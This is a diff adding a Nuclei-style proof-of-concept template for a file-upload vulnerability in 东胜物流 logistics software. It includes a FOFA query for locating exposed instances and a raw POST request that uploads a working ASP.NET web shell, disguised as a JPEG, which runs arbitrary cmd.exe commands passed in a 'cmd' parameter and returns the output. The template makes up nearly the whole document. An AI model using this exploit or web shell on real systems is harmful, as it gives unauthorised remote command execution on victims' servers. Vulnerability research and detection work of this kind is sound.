@@ -1,0 +1,19 @@
+id: poc-svqgw9c77ohzr333
+info:
+  name: 东胜物流 UploadMailFile 存在文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/svqgw9c77ohzr333'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: svqgw9c77ohzr333
+    fofa: (body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css") && body="东胜"
+http:
+- raw:
+  - "POST /CommMng/Print/UploadMailFile HTTP/1.1\nHost: {{Hostname}}\nContent-Type: multipart/form-data; boundary=----Boundary123\n\n------Boundary123\nContent-Disposition: form-data; name=\"LoadFile\"; filename=\"shell.aspx\"\nContent-Type: image/jpeg\n\n<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e){\n    string c = Request[\"cmd\"];\n    if(c != null){\n        ProcessStartInfo psi = new ProcessStartInfo(\"cmd.exe\", \"/c \" + c);\n        psi.RedirectStandardOutput = true;\n        psi.UseShellExecute = false;\n        Process p = Process.Start(psi);\n        Response.Write(\"<pre>\" + p.StandardOutput.ReadToEnd() + \"</pre>\");\n    }\n}\n</script>\n------Boundary123--\n![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1780926668064-be0d2760-c65f-417d-ab0b-f020871e7e77.png)"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
